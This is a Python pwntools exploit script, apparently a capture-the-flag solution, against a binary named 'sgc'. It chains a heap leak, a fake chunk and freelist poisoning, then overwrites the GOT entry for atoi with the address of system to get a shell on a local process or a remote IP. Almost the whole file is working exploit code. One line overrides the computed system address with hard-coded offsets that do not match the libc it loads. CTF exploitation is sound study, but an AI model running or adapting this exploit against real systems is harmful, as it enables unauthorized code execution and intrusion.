from pwn import *
import sys, time

def add_user(user_name, group_name, age):
	print p.recvuntil("Action: ")
	p.sendline("0")
	print p.recvuntil("name: ")
	p.sendline(user_name)
	print p.recvuntil("group: ")
	p.sendline(group_name)
	print p.recvuntil("age: ")
	p.sendline(str(age))

def display_group(group_name):
	print p.recvuntil("Action: ")
	p.sendline("1")
	print p.recvuntil("name: ")
	p.sendline(group_name)

def display_user(idx):
	print p.recvuntil("Action: ")
	p.sendline("2")
	print p.recvuntil("index: ")
	p.sendline(str(idx))

def edit_group(idx, yn, group_name):
	print p.recvuntil("Action: ")
	p.sendline("3")
	print p.recvuntil("index: ")
	p.sendline(str(idx))
	print p.recvuntil("(y/n): ")
	p.sendline(yn)
	print p.recvuntil("name: ")
	p.sendline(group_name)

def delete_user(idx):
	print p.recvuntil("Action: ")
	p.sendline("4")
	print p.recvuntil("index: ")
	p.sendline(str(idx))

def leak_mem():
	p.recvuntil("Group: ")
	leak = u64(p.recvline()[:-1].ljust(8, "\x00"))
        log.info("leak : 0x%x" % leak)
	return leak



target = "./sgc"
libc_name = "./libc-2.26.so"
binary = ELF(target)
libc = ELF(libc_name)

if len(sys.argv) == 1:
	p = process(target)
else:
	p = remote("35.198.176.224", 1337)

fake_chunk = p64(0) + p64(0x21)

add_user("aaa", "111", 0)
add_user("bbb", "222", 0)
add_user("ccc", "333", 0)
add_user("\x00", fake_chunk, 0)
delete_user(1)
raw_input()

for i in range(255):
	edit_group(0, "n", "111")
time.sleep(1)

display_user(0)
heap_base = leak_mem() - 0x1c0
log.info("heap base : 0x%x" % heap_base)
raw_input()
fake_chunk_addr = heap_base + 0x2e0
mal_fd = p64(fake_chunk_addr)
edit_group(0, "y", mal_fd)

edit_group(2, "n", "abcdef")

payload = "a"*8 + p64(binary.got['atoi']) * 2
edit_group(2, "n", payload)

display_user(3)
atoi_addr = leak_mem()
system_addr = atoi_addr + (libc.symbols['system'] - libc.symbols['atoi'])
system_addr = atoi_addr + (0x45390-0x36e80)
log.info("system addr : 0x%x" % system_addr)

sss = hex(system_addr).replace("0x","").decode("hex")[::-1]
edit_group(3,"y",sss)
add_user("aa","bb","sh")

p.interactive()
